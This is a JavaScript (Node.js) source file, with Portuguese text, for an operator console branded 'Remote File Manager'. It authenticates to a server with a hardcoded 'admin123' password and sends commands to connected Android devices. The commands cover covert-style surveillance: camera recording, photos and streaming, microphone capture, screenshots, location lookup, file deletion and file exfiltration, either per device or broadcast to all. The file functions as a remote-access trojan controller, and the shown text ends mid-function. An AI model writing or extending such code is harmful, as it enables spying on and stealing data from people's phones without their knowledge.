// Polyfill para fetch em Node.js
let fetch;
try {
  // Tentar usar fetch nativo (Node.js 18+)
  fetch = globalThis.fetch;
} catch (e) {
  // Fallback para node-fetch
  try {
    fetch = require('node-fetch');
  } catch (e2) {
    // Fallback para https nativo
    const https = require('https');
    const http = require('http');
    
    fetch = function(url, options = {}) {
      return new Promise((resolve, reject) => {
        const urlObj = new URL(url);
        const isHttps = urlObj.protocol === 'https:';
        const lib = isHttps ? https : http;
        
        const reqOptions = {
          hostname: urlObj.hostname,
          port: urlObj.port,
          path: urlObj.pathname + urlObj.search,
          method: options.method || 'GET',
          headers: options.headers || {}
        };
        
        const req = lib.request(reqOptions, (res) => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => {
            resolve({
              ok: res.statusCode >= 200 && res.statusCode < 300,
              status: res.statusCode,
              statusText: res.statusMessage,
              json: () => Promise.resolve(JSON.parse(data)),
              text: () => Promise.resolve(data)
            });
          });
        });
        
        req.on('error', reject);
        
        if (options.body) {
          req.write(options.body);
        }
        
        req.end();
      });
    };
  }
}

const readline = require('readline');
const chalk = require('chalk');

// Funções auxiliares simplificadas
const showLocationInfo = (location) => {
  if (!location) return;
  console.log(chalk.cyan('\n📍 Localização:'));
  console.log(chalk.white(`   🌍 País: ${location.country || 'N/A'}`));
  console.log(chalk.white(`   🏙️  Cidade: ${location.city || 'N/A'}`));
  console.log(chalk.white(`   📡 ISP: ${location.isp || 'N/A'}`));
  console.log(chalk.white(`   🌐 IP: ${location.query || 'N/A'}`));
};

const base64ToPng = async (base64Data) => {
  try {
    const fs = require('fs');
    const timestamp = Date.now();
    const filename = `screenshot_${timestamp}.png`;
    
    // Remover prefixo data:image se existir
    const base64Clean = base64Data.replace(/^data:image\/[a-z]+;base64,/, '');
    
    fs.writeFileSync(filename, base64Clean, 'base64');
    console.log(chalk.green(`📸 Screenshot salvo: ${filename}`));
    return filename;
  } catch (error) {
    console.error(chalk.red('❌ Erro ao salvar screenshot:'), error.message);
    throw error;
  }
};

function printFileList(files) {
  const formatBytes = (bytes) => {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  const formatDate = (dateStr) => {
    if (!dateStr) return 'N/A';
    const date = new Date(dateStr);
    return date.toLocaleString('pt-BR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  const maxNameLength = Math.max(...files.map(file => file.name.length), 20);

  console.log(chalk.bold.cyan('\n📂 Lista de Arquivos e Pastas'));
  console.log(chalk.bold(
    'Nome'.padEnd(maxNameLength) +
    ' | Tipo    | Tamanho    | Modificado'
  ));
  console.log('-'.repeat(maxNameLength + 32));

  files.forEach(file => {
    const isDir = file.isDirectory;
    const icon = isDir ? '📁' : '📄';
    const type = isDir ? 'Pasta' : 'Arquivo';
    const name = file.name.padEnd(maxNameLength);
    const size = formatBytes(file.size).padStart(10);
    const modified = formatDate(file.mtime);

    console.log(
      `${chalk.yellow(icon)} ${name} | ` +
      `${chalk.green(type.padEnd(7))} | ` +
      `${chalk.blue(size)} | ` +
      `${chalk.gray(modified)}`
    );
  });

  console.log(chalk.bold(`\nTotal: ${files.length} itens\n`));
}

class AdminClient {
  constructor(serverUrl = 'http://localhost:8080', password = 'admin123') {
    this.serverUrl = serverUrl;
    this.password = password;
    this.adminId = null;
    this.isConnected = false;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = 5;
    this.reconnectDelay = 3000;
    this.selectedClient = null; // Cliente selecionado
    this.clientInfo = new Map(); // Informações dos clientes
    this.clientPaths = new Map();
    this.statusInterval = null;

    this.setupReadline();
    this.connect();
  }

  setupReadline() {
    this.rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });

    this.rl.on('line', (input) => {
      if (this.isConnected && this.adminId) {
        this.handleCommand(input.trim());
      } else {
        console.log(chalk.yellow('⏳ Aguarde a autenticação...'));
        // Reexecutar comando após 1 segundo se ainda não conectado
        setTimeout(() => {
          if (this.isConnected && this.adminId) {
            this.handleCommand(input.trim());
          }
        }, 1000);
      }
    });
  }

  async connect() {
    console.log(chalk.blue(`🔌 Conectando ao servidor ${this.serverUrl}...`));

    try {
      // Autenticar admin via HTTP REST
      const authResponse = await fetch(`${this.serverUrl}/admin/auth`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          password: this.password
        }),
      });

      if (!authResponse.ok) {
        throw new Error(`HTTP ${authResponse.status}: Autenticação falhou`);
      }

      const authResult = await authResponse.json();
      this.adminId = authResult.admin_id;
      
      this.onConnect();

    } catch (error) {
      console.error(chalk.red('❌ Erro ao conectar:'), error.message);
      this.onError(error);
      this.scheduleReconnect();
    }
  }

  onConnect() {
    this.isConnected = true;
    this.reconnectAttempts = 0;
    
    console.log(chalk.green('✅ Conectado ao servidor HTTP REST!'));
    console.log(chalk.green.bold('\n👑 AUTENTICADO COMO ADMIN'));
    console.log(chalk.cyan(`📋 Admin ID: ${this.adminId}`));
    console.log(chalk.yellow('\n💡 Digite "help" para ver os comandos disponíveis'));
    console.log(chalk.gray('ℹ️  Modo HTTP REST - comandos enviados via POST /admin/{id}/command\n'));
    
    // Aguardar um momento antes de permitir comandos
    setTimeout(() => {
      this.updatePrompt();
      
      // Iniciar polling para status e atualizações (opcional)
      this.startStatusPolling();
    }, 1000);
  }

  // Método removido - onMessage não é necessário para HTTP REST
  // As respostas são processadas diretamente no método send() via handleServerResponse()

  onDisconnect() {
    this.isConnected = false;
    this.adminId = null;
    
    if (this.statusInterval) {
      clearInterval(this.statusInterval);
      this.statusInterval = null;
    }
    
    console.log(chalk.yellow('\n⚠️  Desconectado do servidor'));

    if (this.reconnectAttempts < this.maxReconnectAttempts) {
      this.scheduleReconnect();
    } else {
      console.log(chalk.red('❌ Número máximo de tentativas de reconexão atingido'));
      console.log(chalk.yellow('💡 Digite "reconnect" para tentar novamente'));
    }
  }

  startStatusPolling() {
    // Polling opcional para atualizações de status
    // Como o HTTP REST não tem eventos em tempo real, podemos fazer polling periódico
    this.statusInterval = setInterval(async () => {
      try {
        // Verificar se ainda estamos conectados fazendo um ping
        await this.send({ type: 'ping' });
      } catch (error) {
        console.log(chalk.yellow('⚠️ Perdeu conexão com servidor'));
        this.onDisconnect();
      }
    }, 30000); // Ping a cada 30 segundos
  }

  handleServerResponse(response) {
    // Processar respostas do servidor HTTP
    if (response.type) {
      switch (response.type) {
        case 'client_list':
          this.displayClientList(response.clients);
          // Salvar informações dos clientes
          response.clients.forEach(client => {
            this.clientInfo.set(client.id, client);
            // Definir path padrão se não tiver
            if (!this.clientPaths.has(client.id)) {
              this.clientPaths.set(client.id, '/storage/emulated/0');
            }
          });
          this.updatePrompt();
          break;

        case 'command_result':
          if (response.success) {
            console.log(chalk.green(`\n✅ ${response.message || 'Comando executado com sucesso'}`));
          } else {
            console.log(chalk.red(`\n❌ ${response.message || 'Erro ao executar comando'}`));
          }
          this.updatePrompt();
          break;

        case 'server_status':
          this.displayServerStatus(response);
          this.updatePrompt();
          break;

        case 'admin_list':
          this.displayAdminList(response.admins);
          this.updatePrompt();
          break;
        
        case 'pong':
          console.log(chalk.gray(`\n🏓 Pong recebido`));
          this.updatePrompt();
          break;
          
        default:
          console.log(chalk.gray(`\n📩 Resposta: ${JSON.stringify(response)}`));
          this.updatePrompt();
      }
    } else {
      // Resposta sem tipo definido - tentar identificar
      if (response.clients && Array.isArray(response.clients)) {
        // É uma lista de clientes
        this.handleServerResponse({...response, type: 'client_list'});
      } else {
        console.log(chalk.gray(`\n📩 Resposta: ${JSON.stringify(response)}`));
        this.updatePrompt();
      }
    }
  }

  onError(error) {
    if (error.code === 'ECONNREFUSED') {
      console.error(chalk.red('❌ Não foi possível conectar ao servidor'));
    } else {
      console.error(chalk.red('❌ Erro:'), error.message);
    }
  }

  scheduleReconnect() {
    this.reconnectAttempts++;
    console.log(chalk.yellow(`🔄 Tentando reconectar em ${this.reconnectDelay / 1000}s (${this.reconnectAttempts}/${this.maxReconnectAttempts})...`));

    setTimeout(() => {
      this.connect();
    }, this.reconnectDelay);
  }

  async send(data) {
    if (!this.adminId || !this.isConnected) {
      console.log(chalk.red('❌ Admin não autenticado'));
      return false;
    }

    try {
      const response = await fetch(`${this.serverUrl}/admin/${this.adminId}/command`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      const result = await response.json();
      
      // Processar resposta do servidor se houver
      if (result) {
        this.handleServerResponse(result);
      }
      
      return true;
    } catch (error) {
      console.error(chalk.red('❌ Erro ao enviar comando:'), error.message);
      return false;
    }
  }

  async handleCommand(input) {
    if (!input) {
      this.updatePrompt();
      return;
    }

    const [cmd, ...args] = input.split(' ');


    if (this.selectedClient === null){
      switch (cmd.toLowerCase()) {
        case 'clients':
      case 'list':
        this.send({ type: 'list_clients' });
        break;
      case 'select':
      case 'sel':
        if (args.length === 0) {
          if (this.selectedClient !== null) {
            const currentPath = this.clientPaths.get(this.selectedClient) || '/storage/emulated/0';
            console.log(chalk.cyan(`📌 Cliente selecionado atualmente: ${this.selectedClient}`));
            const client = this.clientInfo.get(this.selectedClient);
            if (client) {
              console.log(chalk.gray(`   📱 Tipo: ${client.deviceType}`));
              console.log(chalk.gray(`   📍 Endereço: ${client.address}:${client.port}`));
            }
          } else {
            console.log(chalk.yellow('Nenhum cliente selecionado'));
            console.log(chalk.gray('Uso: select <client_id>'));
            console.log(chalk.gray('Exemplo: select 1'));
          }
        } else {
          const clientId = parseInt(args[0]);

          // Verificar se o cliente existe
          if (this.clientInfo.has(clientId)) {
            this.selectedClient = clientId;
            const currentPath = this.clientPaths.get(clientId) || '/storage/emulated/0';
            const client = this.clientInfo.get(clientId);
            console.log(chalk.green(`✅ Cliente ${clientId} selecionado!`));
            console.log(chalk.gray(`   📱 Tipo: ${client.deviceType}`));
            console.log(chalk.gray(`   📍 Endereço: ${client.address}:${client.port}`));
            console.log(chalk.cyan(`\n💡 Agora os comandos (ls, cd, rm, upload) serão enviados apenas para este cliente`));
            console.log(chalk.gray(`   Use "deselect" para voltar ao modo broadcast`));
          } else {
            console.log(chalk.red(`❌ Cliente ${clientId} não encontrado`));
            console.log(chalk.yellow(`💡 Use "clients" para ver os clientes disponíveis`));
          }
        }
        break;
    }
    return
  }


    switch (cmd.toLowerCase()) {
      case 'help':
      case '?':
        this.showHelp();
        break;

      case 'clients':
      case 'list':
        this.send({ type: 'list_clients' });
        break;

      case 'admins':
        this.send({ type: 'list_admins' });
        break;

      case 'status':
        this.send({ type: 'server_status' });
        break;

      case 'send':
        if (args.length < 2) {
          // Se tem cliente selecionado, enviar diretamente
          if (this.selectedClient !== null) {
            const message = args.join(' ');

            try {
              const jsonMessage = JSON.parse(message);
              this.send({
                type: 'send_to_client',
                clientId: this.selectedClient,
                message: jsonMessage
              });
              console.log(chalk.green(`📤 Comando enviado para cliente ${this.selectedClient}`));
            } catch (error) {
              console.log(chalk.red('❌ JSON inválido'));
            }
          } else {
            console.log(chalk.yellow('Uso: send <client_id> <comando_json>'));
            console.log(chalk.gray('Ou selecione um cliente primeiro com: select <id>'));
            console.log(chalk.gray('Exemplo: send 1 {"type":"list_files","path":"/sdcard"}'));
          }
        } else {
          const clientId = parseInt(args[0]);
          const message = args.slice(1).join(' ');

          try {
            const jsonMessage = JSON.parse(message);
            this.send({
              type: 'send_to_client',
              clientId: clientId,
              message: jsonMessage
            });
            console.log(chalk.green(`📤 Comando enviado para cliente ${clientId}`));
          } catch (error) {
            console.log(chalk.red('❌ JSON inválido'));
          }
        }
        break;

      case 'broadcast':
        if (args.length === 0) {
          console.log(chalk.yellow('Uso: broadcast <comando_json>'));
          console.log(chalk.gray('Exemplo: broadcast {"type":"get_status"}'));
        } else {
          const message = args.join(' ');

          try {
            const jsonMessage = JSON.parse(message);
            this.send({
              type: 'broadcast_to_clients',
              message: jsonMessage
            });
            console.log(chalk.green('📢 Broadcast enviado'));
          } catch (error) {
            console.log(chalk.red('❌ JSON inválido'));
          }
        }
        break;

      case 'kick':
        if (args.length === 0) {
          console.log(chalk.yellow('Uso: kick <client_id>'));
        } else {
          const clientId = parseInt(args[0]);
          this.send({
            type: 'kick_client',
            clientId: clientId
          });
        }
        break;

      case 'state':
        if (args.length === 0) {
          if (this.selectedClient !== null) {
            this.send({
              type: 'get_client_state',
              clientId: this.selectedClient
            });
          } else {
            console.log(chalk.yellow('Uso: state <client_id>'));
            console.log(chalk.gray('Ou selecione um cliente primeiro com: select <id>'));
          }
        } else {
          const clientId = parseInt(args[0]);
          this.send({
            type: 'get_client_state',
            clientId: clientId
          });
        }
        break;

      case 'select':
      case 'sel':
        if (args.length === 0) {
          if (this.selectedClient !== null) {
            const currentPath = this.clientPaths.get(this.selectedClient) || '/storage/emulated/0';
            console.log(chalk.cyan(`📌 Cliente selecionado atualmente: ${this.selectedClient}`));
            const client = this.clientInfo.get(this.selectedClient);
            if (client) {
              console.log(chalk.gray(`   📱 Tipo: ${client.deviceType}`));
              console.log(chalk.gray(`   📍 Endereço: ${client.address}:${client.port}`));
            }
          } else {
            console.log(chalk.yellow('Nenhum cliente selecionado'));
            console.log(chalk.gray('Uso: select <client_id>'));
            console.log(chalk.gray('Exemplo: select 1'));
          }
        } else {
          const clientId = parseInt(args[0]);

          // Verificar se o cliente existe
          if (this.clientInfo.has(clientId)) {
            this.selectedClient = clientId;
            const currentPath = this.clientPaths.get(clientId) || '/storage/emulated/0';
            const client = this.clientInfo.get(clientId);
            console.log(chalk.green(`✅ Cliente ${clientId} selecionado!`));
            console.log(chalk.gray(`   📱 Tipo: ${client.deviceType}`));
            console.log(chalk.gray(`   📍 Endereço: ${client.address}:${client.port}`));
            console.log(chalk.cyan(`\n💡 Agora os comandos (ls, cd, rm, upload) serão enviados apenas para este cliente`));
            console.log(chalk.gray(`   Use "deselect" para voltar ao modo broadcast`));
          } else {
            console.log(chalk.red(`❌ Cliente ${clientId} não encontrado`));
            console.log(chalk.yellow(`💡 Use "clients" para ver os clientes disponíveis`));
          }
        }
        break;

      case 'deselect':
      case 'desel':
        if (this.selectedClient !== null) {
          const prevClient = this.selectedClient;
          this.selectedClient = null;
          console.log(chalk.yellow(`📌 Cliente ${prevClient} desselecionado`));
          console.log(chalk.cyan(`💡 Modo broadcast ativado - comandos serão enviados para todos os clientes`));
        } else {
          console.log(chalk.gray('Nenhum cliente estava selecionado'));
        }
        break;
      case 'rec':
        if (this.selectedClient !== null) {
          if (args.length === 0) {
            console.log(chalk.yellow('Use: rec front | rec back'));
          }
          const cameratype = args.join(' ') || '';
          if (cameratype != 'front' && cameratype != 'back') {
            console.log(chalk.yellow('Use: rec front | rec back'));
            break;
          }
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'rec', cameratype: cameratype, }
          });
        } else {

        }
        break;
      case 'rec_stop':
        if (this.selectedClient !== null) {
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'rec_stop' }
          });
        } else {
        }
        break;
        case 'stream':
          if (this.selectedClient !== null) {
            if (args.length === 0) {
              console.log(chalk.yellow('Use: rec front | rec back'));
            }
            const cameratype = args.join(' ') || '';
            if (cameratype != 'front' && cameratype != 'back') {
              console.log(chalk.yellow('Use: rec front | rec back'));
              break;
            }
            this.send({
              type: 'send_to_client',
              clientId: this.selectedClient,
              message: { type: 'stream' }
            });
          } else {
  
          }
          break;
          case 'stopstream':
            if (this.selectedClient !== null) {
              this.send({
                type: 'send_to_client',
                clientId: this.selectedClient,
                message: { type: 'stopstream' }
              });
            } else {
    
            }
            break;
        case 'pic':
          if (this.selectedClient !== null) {
            if (args.length === 0) {
              console.log(chalk.yellow('Use: pic front | pic back'));
            }
            const cameratype = args.join(' ') || '';
            if (cameratype != 'front' && cameratype != 'back') {
              console.log(chalk.yellow('Use: rec front | rec back'));
              break;
            }
            this.send({
              type: 'send_to_client',
              clientId: this.selectedClient,
              message: { type: 'pic', cameratype: cameratype, }
            });
          } else {
  
          }
          break;
        case 'play':
          if (this.selectedClient !== null) {
            if (args.length === 0) {
              console.log(chalk.yellow('Use: play file | play https://'));
            }
            const file = args.join(' ') || '';
            if (!file) {
              console.log(chalk.yellow('Use: rec front | rec back'));
              break;
            }
            this.send({
              type: 'send_to_client',
              clientId: this.selectedClient,
              message: { type: 'play', video: file, }
            });
          } else {
  
          }
          break;
        case 'mic':
        if (this.selectedClient !== null) {
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'mic' }
          });
        } else {
        }
        break;
        case 'mic_stop':
        if (this.selectedClient !== null) {
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'mic_stop' }
          });
        } else {
        }
        break;
        case 'shot':
        if (this.selectedClient !== null) {
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'screenshot' }
          });
        } else {

        }
        break;

      case 'ls':
        const lsPath = args[0] || '';
        if (this.selectedClient !== null) {
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'list_files', path: lsPath }
          });
          console.log(chalk.green(`📂 Comando ls enviado para cliente ${this.selectedClient}: ${lsPath}`));
        } else {
          this.send({
            type: 'broadcast_to_clients',
            message: { type: 'list_files', path: lsPath }
          });
          console.log(chalk.green(`📂 Comando ls enviado (broadcast): ${lsPath}`));
        }
        break;

      case 'cd':
        if (args.length === 0) {
          console.log(chalk.yellow('Uso: cd <caminho>'));
        } else {
          const cdPath = args.join(' ');
          if (this.selectedClient !== null) {
            this.send({
              type: 'send_to_client',
              clientId: this.selectedClient,
              message: { type: 'change_directory', path: cdPath }
            });
            console.log(chalk.green(`📂 Comando cd enviado para cliente ${this.selectedClient}: ${cdPath}`));
          } else {
            this.send({
              type: 'broadcast_to_clients',
              message: { type: 'change_directory', path: cdPath }
            });
            console.log(chalk.green(`📂 Comando cd enviado (broadcast): ${cdPath}`));
          }
        }
        break;

      case 'rm':
        if (args.length === 0) {
          console.log(chalk.yellow('Uso: rm <caminho_arquivo>'));
        } else {
          const rmPath = args.join(' ');
          if (this.selectedClient !== null) {
            this.send({
              type: 'send_to_client',
              clientId: this.selectedClient,
              message: { type: 'delete_file', path: rmPath }
            });
            console.log(chalk.green(`🗑️  Comando rm enviado para cliente ${this.selectedClient}: ${rmPath}`));
          } else {
            this.send({
              type: 'broadcast_to_clients',
              message: { type: 'delete_file', path: rmPath }
            });
            console.log(chalk.green(`🗑️  Comando rm enviado (broadcast): ${rmPath}`));
          }
        }
        break;

      case 'location':
        if (this.selectedClient !== null) {
          this.send({
            type: 'send_to_client',
            clientId: this.selectedClient,
            message: { type: 'location' }
          });
        } else {
        }
        break;

      case 'down':
      case 'download':
        if (args.length === 0) {
          console.log(chalk.yellow('Uso: upload <caminho_arquivo>'));
        } else {
          const uploadPath = args.join(' ');
          if (this.selectedClient !== null) {
            this.send({
              type: 'send_to_client',
              clientId: this.selectedClient,
              message: { type: 'download_file', file: uploadPath }
            });
            console.log(chalk.green(`📤 Comando upload enviado para cliente ${this.selectedClient}: ${uploadPath}`));
          } /*else {
            this.send({
              type: 'broadcast_to_clients',
              message: { type: 'upload_file', file: uploadPath }
            });
            console.log(chalk.green(`📤 Comando upload enviado (broadcast): ${uploadPath}`));
          }*/
        }
        break;
        case 'upload':
          if (args.length === 0) {
            console.log(chalk.yellow('Uso: upload <caminho_arquivo>'));
          } else {
            const uploadPath = args.join(' ');
            if (this.selectedClient !== null) {
              this.send({
                type: 'send_to_client',
                clientId: this.selectedClient,
                message: { type: 'upload_file', file: uploadPath }
              });
              console.log(chalk.green(`📤 Comando upload enviado para cliente ${this.selectedClient}: ${uploadPath}`));
            } /*else {
              this.send({
                type: 'broadcast_to_clients',
                message: { type: 'upload_file', file: uploadPath }
              });
              console.log(chalk.green(`📤 Comando upload enviado (broadcast): ${uploadPath}`));
            }*/
          }
          break;

      case 'ping':
        await this.send({ type: 'ping' });
        break;

      case 'debug':
        if (args.length === 0) {
          console.log(chalk.yellow('Uso: debug <comando>'));
          console.log(chalk.gray('Exemplos:'));
          console.log(chalk.gray('  debug ls /sdcard'));
          console.log(chalk.gray('  debug cd /storage/emulated/0'));
        } else {
          const debugCmd = args[0];
          const debugArgs = args.slice(1);

          let debugMessage = null;

          switch (debugCmd) {
            case 'ls':
              debugMessage = { type: 'list_files', path: debugArgs[0] || '' };
              break;
            case 'cd':
              debugMessage = { type: 'change_directory', path: debugArgs.join(' ') };
              break;
            case 'rm':
              debugMessage = { type: 'delete_file', path: debugArgs.join(' ') };
              break;
            case 'upload':
              debugMessage = { type: 'upload_file', file: debugArgs.join(' ') };
              break;
            case 'download':
              debugMessage = { type: 'download_file', file: debugArgs.join(' ') };
              break;
            default:
              try {
                debugMessage = JSON.parse(args.join(' '));
              } catch {
                console.log(chalk.red('❌ Comando inválido'));
                break;
              }
          }

          if (debugMessage) {
            console.log(chalk.cyan('\n🔍 Debug - Mensagem que seria enviada:'));
            console.log(chalk.yellow(JSON.stringify(debugMessage, null, 2)));
            console.log(chalk.gray(`\nTamanho: ${JSON.stringify(debugMessage).length} bytes`));
          }
        }
        break;

      case 'reconnect':
        this.reconnectAttempts = 0;
        console.log(chalk.blue('🔄 Tentando reconectar...'));
        this.connect();
        break;

      case 'clear':
        console.clear();
        this.showBanner();
        break;

      case 'exit':
      case 'quit':
        this.disconnect();
        break;

      default:
        console.log(chalk.red(`❌ Comando desconhecido: ${cmd}`));
        console.log(chalk.yellow('💡 Digite "help" para ver os comandos disponíveis'));
    }

    this.updatePrompt();
  }

  showHelp() {
    console.log(chalk.cyan.bold('\n=== ADMIN CLIENT - COMANDOS ==='));
    console.log(chalk.white('\n📊 Informações do Servidor:'));
    console.log('  help, ?           - Mostra esta ajuda');
    console.log('  clients, list     - Lista todos os clientes conectados');
    console.log('  admins            - Lista todos os admins conectados');
    console.log('  status            - Mostra status do servidor');
    console.log('  state [id]        - Mostra estado de um cliente (usa selecionado se omitido)');

    console.log(chalk.white('\n🎯 Seleção de Cliente:'));
    console.log('  select <id>       - Seleciona um cliente específico');
    console.log('  deselect          - Desseleciona o cliente atual (volta ao broadcast)');
    console.log(chalk.gray('  💡 Quando um cliente está selecionado, os comandos ls/cd/rm/upload'));
    console.log(chalk.gray('     são enviados apenas para ele ao invés de broadcast'));

    console.log(chalk.white('\n📤 Envio de Comandos:'));
    console.log('  send <id> <json>  - Envia comando para cliente específico');
    console.log('  send <json>       - Envia para cliente selecionado (se houver)');
    console.log('  broadcast <json>  - Envia comando para todos os clientes');
    console.log('  kick <id>         - Desconecta um cliente');

    console.log(chalk.white('\n📂 Comandos de File Manager:'));
    console.log('  ls [caminho]      - Lista arquivos (cliente selecionado ou broadcast)');
    console.log('  cd <caminho>      - Muda diretório (cliente selecionado ou broadcast)');
    console.log('  rm <arquivo>      - Remove arquivo (cliente selecionado ou broadcast)');
    console.log('  upload <arquivo>  - Faz upload de arquivo (cliente selecionado ou broadcast)');

    console.log(chalk.white('\n🔧 Utilitários:'));
    console.log('  ping              - Testa conexão com servidor');
    console.log('  debug <cmd>       - Mostra o JSON que seria enviado (sem enviar)');
    console.log('  reconnect         - Reconecta ao servidor');
    console.log('  clear             - Limpa a tela');
    console.log('  exit, quit        - Desconecta e sai');

    console.log(chalk.yellow('\n📝 Exemplos:'));
    console.log(chalk.gray('  # Modo tradicional (especificar cliente)'));
    console.log(chalk.gray('  send 1 {"type":"list_files","path":"/sdcard/Downloads"}'));
    console.log(chalk.gray('  \n  # Modo seleção (mais prático)'));
    console.log(chalk.gray('  select 1           # Seleciona cliente 1'));
    console.log(chalk.gray('  ls /sdcard/DCIM    # Envia apenas para cliente 1'));
    console.log(chalk.gray('  cd Downloads       # Envia apenas para cliente 1'));
    console.log(chalk.gray('  deselect           # Volta ao modo broadcast'));
    console.log(chalk.gray('  ls /sdcard         # Agora envia para todos'));
    console.log(chalk.cyan('\n================================\n'));
  }

  showBanner() {
    console.log(chalk.green.bold('\n╔════════════════════════════════════════╗'));
    console.log(chalk.green.bold('║   REMOTE FILE MANAGER - ADMIN CLIENT   ║'));
    console.log(chalk.green.bold('╚════════════════════════════════════════╝'));
  }

  displayClientList(clients) {
    if (!clients || clients.length === 0) {
      console.log(chalk.yellow('\n📭 Nenhum cliente conectado'));
      return;
    }

    const refClient = clients.reduce((max, client) => {
      const maxDeviceType = max.device_type || max.deviceType || '';
      const clientDeviceType = client.device_type || client.deviceType || '';
      const maxLen = maxDeviceType.length;
      const clientLen = clientDeviceType.length;
      return clientLen > maxLen ? client : max;
    }, clients[0]);

    const maxDeviceTypeLength = Math.max(12, (refClient.device_type || refClient.deviceType || 'Unknown').length);
    const separatorLength = maxDeviceTypeLength + 16 + 12 + 5 + 12 + 10;

    console.log(chalk.cyan.bold(`\n👥 Clientes Conectados (${clients.length}):`));
    console.log(chalk.white('─'.repeat(90)));
    const deviceTypeHeader = (refClient.device_type || refClient.deviceType || 'Unknown');
    console.log(chalk.bold(`ID | Endereço                 | Tipo ${' '.repeat(Math.max(0, deviceTypeHeader.length - 4))}| Conectado há | Msgs  | Status      `));
    console.log(chalk.white('─'.repeat(90)));

    clients.forEach(client => {
      const connectedAt = client.connected_at || client.connectedAt || new Date().toISOString();
      const timeDiff = new Date() - new Date(connectedAt);
      const timeStr = this.formatDuration(timeDiff);
      const port = client.port || '0';
      const address = `${client.address}:${port}`.padEnd(16);
      const deviceType = (client.device_type || client.deviceType || 'Unknown').padEnd(maxDeviceTypeLength);
      const isAlive = client.isAlive !== false; // Default para true se não definido
      const alive = isAlive ? chalk.green('✓ Ativo') : chalk.red('✗ Inativo');
      const selected = this.selectedClient === client.id ? chalk.yellow(' ◄ SELECIONADO') : '';
      const messageCount = client.message_count || client.messageCount || 0;

      console.log(
        `${chalk.yellow(client.id.toString().padStart(2))} | ` +
        `${chalk.gray(address)} | ` +
        `${chalk.cyan(deviceType)} | ` +
        `${chalk.blue(timeStr.padEnd(12))} | ` +
        `${chalk.magenta(messageCount.toString().padStart(5))} | ` +
        `${alive}${selected}`
      );
    });
    console.log(chalk.white('─'.repeat(90)));

    if (this.selectedClient !== null) {
      console.log(chalk.cyan(`\n📌 Cliente ${this.selectedClient} está selecionado (comandos enviados apenas para ele)`));
    } else {
      console.log(chalk.gray('\n💡 Use "select <id>" para selecionar um cliente específico'));
    }
  }

  displayAdminList(admins) {
    if (admins.length === 0) {
      console.log(chalk.yellow('\n📭 Nenhum admin conectado'));
      return;
    }

    console.log(chalk.cyan.bold(`\n👑 Admins Conectados (${admins.length}):`));
    console.log(chalk.white('─'.repeat(70)));
    console.log(chalk.bold('ID | Endereço          | Conectado há | Msgs'));
    console.log(chalk.white('─'.repeat(70)));

    admins.forEach(admin => {
      const timeDiff = new Date() - new Date(admin.connectedAt);
      const timeStr = this.formatDuration(timeDiff);
      const address = `${admin.address}:${admin.port}`.padEnd(16);
      const isYou = admin.id === this.adminId ? chalk.green(' (você)') : '';

      console.log(
        `${chalk.yellow(admin.id.toString().padStart(2))} | ` +
        `${chalk.gray(address)} | ` +
        `${chalk.blue(timeStr.padEnd(12))} | ` +
        `${chalk.magenta(admin.messageCount.toString().padStart(4))}${isYou}`
      );
    });
    console.log(chalk.white('─'.repeat(70)));
  }

  displayServerStatus(status) {
    console.log(chalk.cyan.bold('\n📊 Status do Servidor:'));
    console.log(chalk.white('─'.repeat(50)));
    console.log(chalk.white('🚀 Porta:              ') + chalk.yellow(status.port));
    console.log(chalk.white('👥 Clientes:           ') + chalk.yellow(status.clients));
    console.log(chalk.white('👑 Admins:             ') + chalk.yellow(status.admins));
    console.log(chalk.white('📍 Estados salvos:     ') + chalk.yellow(status.clientStates));
    console.log(chalk.white('⏱️  Uptime:             ') + chalk.yellow(status.uptimeFormatted));
    console.log(chalk.white('💾 Memória:            ') + chalk.yellow(this.formatBytes(status.memory)));
    console.log(chalk.white('🕐 Iniciado em:        ') + chalk.yellow(new Date(status.startTime).toLocaleString('pt-BR')));
    console.log(chalk.white('─'.repeat(50)));
  }

  displayClientState(clientId, state) {
    if (!state) {
      console.log(chalk.red(`\n❌ Cliente ${clientId} não tem estado salvo`));
      return;
    }

    console.log(chalk.cyan.bold(`\n📋 Estado do Cliente ${clientId}:`));
    console.log(chalk.white('─'.repeat(60)));
    console.log(chalk.white('📂 Diretório atual:    ') + chalk.yellow(state.currentPath));
    console.log(chalk.white('📄 Arquivos:           ') + chalk.yellow(state.files ? state.files.length : 0));
    console.log(chalk.white('✅ Selecionados:       ') + chalk.yellow(state.selectedFiles ? state.selectedFiles.length : 0));
    console.log(chalk.white('📤 Fila de upload:     ') + chalk.yellow(state.uploadQueue ? state.uploadQueue.length : 0));
    console.log(chalk.white('🕐 Última atualização: ') + chalk.yellow(new Date(state.lastUpdate).toLocaleString('pt-BR')));
    console.log(chalk.white('─'.repeat(60)));

    if (state.selectedFiles && state.selectedFiles.length > 0) {
      console.log(chalk.cyan('\n✅ Arquivos Selecionados:'));
      state.selectedFiles.forEach((file, index) => {
        const fileName = file.split('/').pop();
        console.log(chalk.gray(`   ${index + 1}. ${fileName}`));
      });
    }
  }

  updatePrompt() {
    const status = this.isConnected ? chalk.green('●') : chalk.red('●');
    const adminInfo = this.adminId ? chalk.cyan(`Admin ${this.adminId}`) : chalk.gray('Desconectado');

    let clientInfo = '';
    if (this.selectedClient !== null) {
      const currentPath = this.clientPaths.get(this.selectedClient) || '/storage/emulated/0';
